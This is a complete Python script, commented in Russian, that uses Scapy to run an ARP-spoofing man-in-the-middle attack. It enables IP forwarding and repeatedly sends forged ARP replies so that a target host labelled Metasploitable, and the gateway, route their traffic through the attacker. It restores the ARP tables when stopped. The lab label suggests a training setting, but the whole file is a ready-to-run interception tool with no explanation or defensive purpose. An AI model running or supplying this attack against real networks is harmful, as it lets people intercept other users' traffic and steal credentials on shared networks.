#!/usr/bin/env python3
from scapy.all import *
import time
import sys

def enable_ip_forward():
    with open("/proc/sys/net/ipv4/ip_forward", "w") as f:
        f.write("1")
    print("[*] IP forwarding enabled")

def get_mac(ip, iface="eth0"):
    """Получить MAC через ARP-запрос"""
    ans, _ = srp(Ether(dst="ff:ff:ff:ff:ff:ff")/ARP(pdst=ip), timeout=2, verbose=False, iface=iface)
    if ans:
        return ans[0][1].hwsrc
    return None

def arp_spoof(target_ip, spoof_ip, target_mac, iface="eth0"):
    """Отправка поддельного ARP-ответа"""
    packet = ARP(op=2, pdst=target_ip, hwdst=target_mac, psrc=spoof_ip)
    send(packet, verbose=False, iface=iface)

def arp_restore(target_ip, source_ip, target_mac, source_mac, iface="eth0"):
    """Восстановление ARP-таблицы"""
    packet = ARP(op=2, pdst=target_ip, hwdst=target_mac, psrc=source_ip, hwsrc=source_mac)
    send(packet, count=5, verbose=False, iface=iface)

def get_my_mac(iface="eth0"):
    """Получить свой MAC"""
    return get_if_hwaddr(iface)

def main():
    # === НАСТРОЙКИ ДЛЯ ВАШЕЙ СЕТИ ===
    IFACE = "eth0"                      # Ваш интерфейс в LAN
    TARGET = "192.168.10.50"            # Metasploitable (жертва)
    GATEWAY = "192.168.10.1"            # Роутер (реальный шлюз)
    
    print(f"[*] Интерфейс: {IFACE}")
    print(f"[*] Жертва: {TARGET}")
    print(f"[*] Шлюз: {GATEWAY}")
    
    # Получаем MAC-адреса
    target_mac = get_mac(TARGET, IFACE)
    gateway_mac = get_mac(GATEWAY, IFACE)
    
    if not target_mac:
        print(f"[-] Не удалось получить MAC для {TARGET}")
        sys.exit(1)
    
    if not gateway_mac:
        print(f"[-] Не удалось получить MAC для {GATEWAY}")
        sys.exit(1)
    
    print(f"[+] MAC жертвы ({TARGET}): {target_mac}")
    print(f"[+] MAC шлюза ({GATEWAY}): {gateway_mac}")
    
    enable_ip_forward()
    
    print("\n[*] Атака запущена. Metasploitable думает, что мы — шлюз...")
    print("[*] Нажмите Ctrl+C для остановки\n")
    
    try:
        while True:
            # Говорим Metasploitable, что мы — шлюз
            arp_spoof(TARGET, GATEWAY, target_mac, IFACE)
            # (Опционально) говорим шлюзу, что мы — Metasploitable
            arp_spoof(GATEWAY, TARGET, gateway_mac, IFACE)
            time.sleep(2)
    except KeyboardInterrupt:
        print("\n[*] Остановка. Восстановление сети...")
        arp_restore(TARGET, GATEWAY, target_mac, gateway_mac, IFACE)
        arp_restore(GATEWAY, TARGET, gateway_mac, target_mac, IFACE)
        print("[+] Готово")

if __name__ == "__main__":
    main()
